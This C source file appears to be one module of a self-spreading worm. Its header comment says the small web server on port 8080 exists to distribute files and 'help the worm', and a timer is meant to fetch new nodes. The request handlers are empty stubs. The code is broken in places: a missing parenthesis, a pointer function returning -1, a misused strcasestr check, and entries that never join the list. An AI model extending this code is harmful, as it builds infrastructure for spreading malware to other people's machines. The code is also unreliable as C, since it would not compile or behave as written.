/*
httpd - small web server..

to help distribute information, files, and help the worm

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"

typedef struct _offered_files {
    struct _offered_files *next;
    char *filename;
    char *data;
    int data_size;
    int type; // static file, or real directory
} Content;

Content *content_list = NULL;

Content *ContentAdd(char *filename, char *data, int size, int type) {
    Content *cptr = NULL;
    char *buf = NULL;
    
    if (((cptr = (Content *)malloc(sizeof(Content))) == NULL) || ((buf = malloc(size)) == NULL)
        return -1;

    memcpy(buf, data, size);
            
    cptr->filename = strdup(filename);
    cptr->data_size = size;
    cptr->type = type;
    cptr->data = buf;
    
    return cptr;
}

Content *ContentFindByName(char *filename) {
    Content *cptr = content_list;
    
    while (cptr != NULL) {
        if (strcasestr(cptr->filename, filename)==0) break;
        cptr = cptr->next;
    }
    
    return cptr;
}

// init httpd (adding the note to the main loop)
int httpd_init(Modules **);
// messages that are read go here afte httpd_read() to queue being parsed into the app
int httpd_incoming(Modules *, Connection *, char *buf, int size);
// loop to deal with timers, logic, etc
int httpd_plumbing(Modules *, Connection *, char *buf, int size);


ModuleFuncs httpd_funcs = {
    NULL, NULL, 
    &httpd_incoming,
    NULL,
    &httpd_plumbing,
    NULL, // no connect
    NULL, // no disconnect
    NULL, NULL
};

Modules ModuleHTTPD = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    8080, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    300,
    // httpd functions
    &httpd_funcs, NULL,
    NULL, 0
};

int httpd_init(Modules **list) {
    Module_Add(list, &ModuleHTTPD);
}

int httpd_incoming(Modules *, Connection *, char *buf, int size) {
    
}

int httpd_plumbing(Modules *, Connection *, char *buf, int size) {
    
}